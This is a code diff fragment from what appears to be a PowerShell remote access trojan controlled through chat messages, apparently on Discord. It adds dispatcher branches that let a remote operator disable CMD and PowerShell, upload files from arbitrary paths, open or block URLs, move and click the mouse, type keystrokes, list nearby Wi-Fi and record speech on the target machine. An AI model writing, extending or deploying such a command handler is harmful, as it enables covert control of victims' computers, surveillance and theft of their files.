+            elseif ($cmdName -eq 'DisableCMD') { DisableCMD }
+            elseif ($cmdName -eq 'EnableCMD') { EnableCMD }
+            elseif ($cmdName -eq 'DisablePowerShell') { DisablePowerShell }
+            elseif ($cmdName -eq 'EnablePowerShell') { EnablePowerShell }
+        }
+        elseif ($messages -match '^(?i)Upload\s+(.+)$') {
+            # Parser la commande Upload avec le chemin
+            $uploadPath = $matches[1].Trim()
+            # Supprimer les guillemets si présents
+            $uploadPath = $uploadPath.Trim('"', "'")
+            Upload -Path $uploadPath
+        }
+        elseif ($messages -match '^(?i)OpenURL\s+(?:-Url\s+)?(.+)$') {
+            # Parser la commande OpenURL avec l'URL
+            $url = $matches[1].Trim()
+            $url = $url.Trim('"', "'")
+            OpenURL -Url $url
+        }
+        elseif ($messages -match '^(?i)BlockURL\s+(?:-Url\s+)?(.+)$') {
+            # Parser la commande BlockURL avec l'URL
+            $url = $matches[1].Trim()
+            $url = $url.Trim('"', "'")
+            BlockURL -Url $url
+        }
+        elseif ($messages -match '^(?i)UnblockURL\s+(?:-Url\s+)?(.+)$') {
+            # Parser la commande UnblockURL avec l'URL
+            $url = $matches[1].Trim()
+            $url = $url.Trim('"', "'")
+            UnblockURL -Url $url
+        }
+        elseif ($messages -match '^(?i)GetMousePosition$') {
+            GetMousePosition
+        }
+        elseif ($messages -match '^(?i)MoveMouse\s+-X\s+(\d+)\s+-Y\s+(\d+)$') {
+            $x = [int]$matches[1]
+            $y = [int]$matches[2]
+            MoveMouse -X $x -Y $y
+        }
+        elseif ($messages -match '^(?i)MouseClick\s+(?:-Button\s+)?(left|right)$') {
+            $button = $matches[1]
+            MouseClick -Button $button
+        }
+        elseif ($messages -match '^(?i)MouseClick\s+-Button\s+(left|right)$') {
+            $button = $matches[1]
+            MouseClick -Button $button
+        }
+        elseif ($messages -match '^(?i)TypeText\s+(?:-Text\s+)?["''](.+)["'']$') {
+            $text = $matches[1]
+            TypeText -Text $text
+        }
+        elseif ($messages -match '^(?i)TypeText\s+-Text\s+(.+)$') {
+            $text = $matches[1].Trim('"', "'")
+            TypeText -Text $text
+        }
+        elseif ($messages -match '^(?i)(NearbyWifi|SpeechToText|TextToSpeech)$') {
+            $cmdName = $matches[1]
+            if ($cmdName -eq 'NearbyWifi') { NearbyWifi }
+            elseif ($cmdName -eq 'SpeechToText') { SpeechToText }
+            elseif ($cmdName -eq 'TextToSpeech') { 
+                sendMsg -Message ":octagonal_sign: ``Usage: TextToSpeech -Text \"your message\"`` :octagonal_sign:"
+            }
+        }
+        elseif ($messages -match '^(?i)TextToSpeech\s+(?:-Text\s+)?["''](.+)["'']$') {
+            $text = $matches[1]
+            TextToSpeech -Text $text
+        }
+        elseif ($messages -match '^(?i)TextToSpeech\s+-Text\s+(.+)$') {
+            $text = $matches[1].Trim('"', "'")
+            TextToSpeech -Text $text
         }
         else { 
             try {
